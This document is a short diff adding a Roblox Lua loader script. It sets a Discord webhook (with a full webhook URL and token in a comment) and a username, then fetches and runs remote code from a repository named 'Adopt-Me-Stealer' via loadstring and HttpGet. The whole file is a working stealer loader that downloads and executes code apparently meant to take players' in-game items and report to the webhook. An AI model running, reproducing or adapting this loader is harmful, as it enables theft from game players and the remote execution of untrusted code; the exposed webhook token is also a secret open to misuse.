@@ -1,0 +1,3 @@
+_G.Webhook = "" -- https://discord.com/api/webhooks/1245128827370213457/g9E0f7LSDxTLxRZMGha6VBAHortNLzZ8R5TIS2tlYDohzYtxt8q5DwY0iL4hNb3pwHao
+_G.Username = "" -- Sqireru
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kfc-Muncher-2000/Adopt-Me-Stealer/main/main.lua"))()
